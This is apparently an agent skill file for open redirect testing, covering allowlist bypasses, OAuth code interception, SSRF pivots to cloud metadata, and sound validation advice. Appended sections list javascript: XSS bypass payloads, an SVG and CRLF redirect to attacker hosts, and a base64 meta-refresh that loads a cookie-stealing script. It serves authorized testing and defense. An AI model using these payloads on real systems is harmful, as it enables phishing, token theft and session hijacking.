---
name: open-redirect
description: Open redirect testing for phishing pivots, OAuth token theft, and allowlist bypass
---

# Open Redirect

Open redirects enable phishing, OAuth/OIDC code and token theft, and allowlist bypass in server-side fetchers that follow redirects. Treat every redirect target as untrusted: canonicalize and enforce exact allowlists per scheme, host, and path.

## Attack Surface

**Server-Driven Redirects**
- HTTP 3xx Location

**Client-Driven Redirects**
- `window.location`, meta refresh, SPA routers

**OAuth/OIDC/SAML Flows**
- `redirect_uri`, `post_logout_redirect_uri`, `RelayState`, `returnTo`/`continue`/`next`

**Multi-Hop Chains**
- Only first hop validated

## High-Value Targets

- Login/logout, password reset, SSO/OAuth flows
- Payment gateways, email links, invite/verification
- Unsubscribe, language/locale switches
- `/out` or `/r` redirectors

## Reconnaissance

### Injection Points

- Params: `redirect`, `url`, `next`, `return_to`, `returnUrl`, `continue`, `goto`, `target`, `callback`, `out`, `dest`, `back`, `to`, `r`, `u`
- OAuth/OIDC/SAML: `redirect_uri`, `post_logout_redirect_uri`, `RelayState`, `state`
- SPA: `router.push`/`replace`, `location.assign`/`href`, meta refresh, `window.open`
- Headers: `Host`, `X-Forwarded-Host`/`Proto`, `Referer`; server-side Location echo

### Parser Differentials

**Userinfo**
- `https://trusted.com@evil.com` → validators parse host as trusted.com, browser navigates to evil.com
- Variants: `trusted.com%40evil.com`, `a%40evil.com%40trusted.com`

**Backslash and Slashes**
- `https://trusted.com\evil.com`, `https://trusted.com\@evil.com`, `///evil.com`, `/\evil.com`

**Whitespace and Control**
- `http%09://evil.com`, `http%0A://evil.com`, `trusted.com%09evil.com`

**Fragment and Query**
- `trusted.com#@evil.com`, `trusted.com?//@evil.com`, `?next=//evil.com#@trusted.com`

**Unicode and IDNA**
- Punycode/IDN: `truѕted.com` (Cyrillic), `trusted.com。evil.com` (full-width dot), trailing dot

### Encoding Bypasses

- Double encoding: `%2f%2fevil.com`, `%252f%252fevil.com`
- Mixed case and scheme smuggling: `hTtPs://evil.com`, `http:evil.com`
- IP variants: decimal 2130706433, octal 0177.0.0.1, hex 0x7f.1, IPv6 `[::ffff:127.0.0.1]`
- User-controlled path bases: `/out?url=/\evil.com`

## Key Vulnerabilities

### Allowlist Evasion

**Common Mistakes**
- Substring/regex contains checks: allows `trusted.com.evil.com`
- Wildcards: `*.trusted.com` also matches `attacker.trusted.com.evil.net`
- Missing scheme pinning: `data:`, `javascript:`, `file:`, `gopher:` accepted
- Case/IDN drift between validator and browser

**Robust Validation**
- Canonicalize with a single modern URL parser (WHATWG URL)
- Compare exact scheme, hostname (post-IDNA), and an explicit allowlist with optional exact path prefixes
- Require absolute HTTPS; reject protocol-relative `//` and unknown schemes

### OAuth/OIDC/SAML

**Redirect URI Abuse**
- Using an open redirect on a trusted domain for redirect_uri enables code interception
- Weak prefix/suffix checks: `https://trusted.com` → `https://trusted.com.evil.com`
- Path traversal/canonicalization: `/oauth/../../@evil.com`
- `post_logout_redirect_uri` often less strictly validated

### Client-Side Vectors

**JavaScript Redirects**
- `location.href`/`assign`/`replace` using user input
- Meta refresh `content=0;url=USER_INPUT`
- SPA routers: `router.push(searchParams.get('next'))`

### Reverse Proxies and Gateways

- Host/X-Forwarded-* may change absolute URL construction
- CDNs that follow redirects for link checking can leak tokens when chained

### SSRF Chaining

- Server-side fetchers (web previewers, link unfurlers) follow 3xx
- Combine with an open redirect on an allowlisted domain to pivot to internal targets (169.254.169.254, localhost)

## Exploitation Scenarios

### OAuth Code Interception

1. Set redirect_uri to `https://trusted.example/out?url=https://attacker.tld/cb`
2. IdP sends code to trusted.example which redirects to attacker.tld
3. Exchange code for tokens; demonstrate account access

### Phishing Flow

1. Send link on trusted domain: `/login?next=https://attacker.tld/fake`
2. Victim authenticates; browser navigates to attacker page
3. Capture credentials/tokens via cloned UI

### Internal Evasion

1. Server-side link unfurler fetches `https://trusted.example/out?u=http://169.254.169.254/latest/meta-data`
2. Redirect follows to metadata; confirm via timing/headers

## Testing Methodology

1. **Inventory surfaces** - Login/logout, password reset, SSO/OAuth flows, payment gateways, email links
2. **Build test matrix** - Scheme × host × path variants and encoding/unicode forms
3. **Compare behaviors** - Server-side validation vs browser navigation results
4. **Multi-hop testing** - Trusted-domain → redirector → external
5. **Prove impact** - Credential phishing, OAuth code interception, internal egress

## Validation

1. Produce a minimal URL that navigates to an external domain via the vulnerable surface; include the full address bar capture
2. Show bypass of the stated validation (regex/allowlist) using canonicalization variants
3. Test multi-hop: prove only first hop is validated and second hop escapes constraints
4. For OAuth/SAML, demonstrate code/RelayState delivery to an attacker-controlled endpoint

## False Positives

- Redirects constrained to relative same-origin paths with robust normalization
- Exact pre-registered OAuth redirect_uri with strict verifier
- Validators using a single canonical parser and comparing post-IDNA host and scheme
- User prompts that show the exact final destination before navigating

## Impact

- Credential and token theft via phishing and OAuth/OIDC interception
- Internal data exposure when server fetchers follow redirects
- Policy bypass where allowlists are enforced only on the first hop
- Cross-application trust erosion and brand abuse

## Pro Tips

1. Always compare server-side canonicalization to real browser navigation; differences reveal bypasses
2. Try userinfo, protocol-relative, Unicode/IDN, and IP numeric variants early
3. In OAuth, prioritize `post_logout_redirect_uri` and less-discussed flows; they're often looser
4. Exercise multi-hop across distinct subdomains and paths
5. For SSRF chaining, target services known to follow redirects
6. Favor allowlists of exact origins plus optional path prefixes
7. Keep a curated suite of redirect payloads per runtime (Java, Node, Python, Go)

## Summary

Redirection is safe only when the final destination is constrained after canonicalization. Enforce exact origins, verify per hop, and treat client-provided destinations as untrusted across every stack.



## Additional Techniques — ported from WebSkills (open-redirect-test)

### Escalate Open Redirect → XSS (javascript: scheme arsenal)

When the redirect sink writes the destination into `location.href`/`window.location` (or an `<a href>`) without scheme-pinning to http/https, a `javascript:` URI executes. Filter-bypass variants to walk when `javascript:` is naively blocked:

```
javascript:alert(1)
java%00script:alert(1)
java%0Ascript:alert(1)
java&tab;script:alert(1)
java%0d%0ascript%0d%0a:alert(0)
javascript://%250Aalert(1)
javascript://%250Aalert(1)//?1
%09Jav%09ascript:alert(document.domain)
/%09/javascript:alert(1);
//%5cjavascript:alert(1);
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
javascript://https://whitelisted.com/?z=%0Aalert(1)
jaVAscript://whitelisted.com//%0d%0aalert(1);//
javascript://whitelisted.com?%a0alert%281%29
/x:1/:///%01javascript:alert(document.cookie)/
javascript:%61lert(1)
javascript:&#37&#54&#49lert(1)          # HTML-entity encoded
```
The whitelisted-domain variants (`javascript://whitelisted.com/...%0aalert(1)`) matter when the app enforces a host allowlist on the redirect but still feeds the value to a client-side navigation sink.

### Whitelist bypass via trusted redirector
```
# Target only accepts google.com → chain google's own open redirect:
https://google.com/amp/s/poc.attacker.com
```

### Open Redirect via SVG file upload
If an upload feature serves SVGs inline, an uploaded SVG can drive a client-side redirect (chains with insecure_file_uploads.md):
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg onload="window.location='http://attacker.tld'" xmlns="http://www.w3.org/2000/svg"></svg>
```

### Tooling
- [Oralyzer](https://github.com/0xNanda/Oralyzer) — automated open-redirect (and CRLF) probing across a param/URL list.


## Additional Techniques — ported from WebSkills (writeup-techniques/open-redirect)

Corpus-derived vectors that go beyond both the base skill and the earlier "open-redirect-test" port (which already covered the `javascript:` arsenal, trusted-redirector chaining, and SVG upload). All additive.

### Percent-sign parser desync (Spring Security OAuth — CVE-2019-11269 / CVE-2019-3778)
Inserting a bare `%` immediately before the host desyncs the validator from the emitter: instead of throwing `RedirectMismatchException`, the framework redirects, and the OAuth `code` leaks to the attacker host.
```
redirect_uri=http://localhost:8086/login/oauth2/code/     (original, valid)
redirect_uri=http://%localhost:9000/login/oauth2/code/    (bypass → redirects to attacker server)
```

### CRLF → header-injection open redirect
Inject `%0d%0a` to write your own `Location:` header (or split the response). Distinct from the client-side sinks the base skill covers — this forges the *server* 3xx. Seen in H1 TikTok "CRLF to XSS & Open Redirection" and unauth Linksys/D-Link header injection.
```
/path?q=%0d%0aLocation:http://attacker.tld
%E5%98%8A%E5%98%8DLocation:http://attacker.tld            (unicode-overlong CR/LF)
...search_links.php"<script>a=/XSS/%0d%0aalert(a.source)</script>
```

### HTTP parameter pollution
Supply the redirect param twice (or nest it): the validator inspects one copy, the sink consumes the other.
```
?redirect=trusted.tld&redirect=attacker.tld
?url=https://trusted.tld/?url=https://attacker.tld
```

### Null-byte / control-char truncation
Append the trusted portion *after* a truncating byte so the sink stops parsing at the attacker host while a naive suffix/`endsWith` check still "sees" the trusted domain.
```
https://attacker.tld%00.trusted.tld
https://attacker.tld%0a.trusted.tld
```

### Fullwidth / fraction-slash normalization desync
When the backend normalizes the value for its regex but fetches/emits the raw string, lookalike code points that normalize to `/` produce a scheme-relative off-site jump. Fuzz systematically with `recollapse`.
```
%ef%bc%8f   →  ／ (fullwidth solidus, normalizes to "/")
%e2%81%84   →  ⁄ (fraction slash)
https://attacker.tld／trusted.tld
```

### Client-side path-traversal + fragment smuggling (Grafana-style)
A SPA helper fully decodes the path (including double-encoded `%252f`), strips the query for validation, then returns the *original* string — the browser re-decodes and walks to a same-origin redirect gadget. Server-side twin: the validator inspects only the path and ignores `#fragment`, but the raw string (fragment included) is emitted as the 302 target.
```
%252f%252fattacker.tld        (double-encoded //, decode-then-return-original gap)
/valid/path#@attacker.tld     (fragment-smuggled host reaches the 302)
```

### Escalation: `data:` + base64 meta-refresh cookie stealer
Beyond `data:` being merely accepted — weaponize a meta-refresh whose base64 body pulls an external cookie-exfil script into the app origin:
```
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdCBzcmM9...">
```
(decodes to `<script src="http://evilsite.com/cookie.js"></script>`.) Related session-theft vector: apps that embed the session ID in the redirected URL (Linksys) leak it straight through the open redirect.

### Escalation: Referer-leak → OAuth token theft
When the token/code sits in the URL, an attacker-controlled page inserted into the redirect chain reads it from the `Referer` header (H1 Rockstar "Referer Leakage → Facebook OAuth token theft") — a chain that needs no `javascript:`/`data:` sink at all.

### Detection: distinguish reflected-but-not-followed from a real redirect
A 200 response with your URL echoed in the HTML body is **not** an open redirect. Only a 30x `Location:` to your host, a `<meta http-equiv=refresh>`, or a client-side `location`/`assign`/`href` navigation — confirmed by an actual HTTP hit on your server (`https://YOURS.oastify.com`) — counts. Verify the navigation, not the reflection.

### Impact framing (corpus reality)
Bare open redirect is frequently informational/$0 — lead the report with the chain (OAuth code/token theft → ATO, SSRF → metadata, XSS). Open-redirect-*only* payouts do exist where phishing impact is concrete on a high-trust brand: Upserve $1200, Expedia login/logout $1000, Affirm/Rockstar $250. Reviewers downgrade "reflected URL that never redirects" and same-origin/relative-only redirects — always prove off-origin navigation.

### Extended vulnerable-param list to fuzz
Additions beyond the base list: `redir`, `link`, `forward`, `view`, `image_url`, `path`, `file`, `page`, `exit`, `window`, `checkout_url`, `ServiceLogin`, `go`, `a`, `r`, `u`.
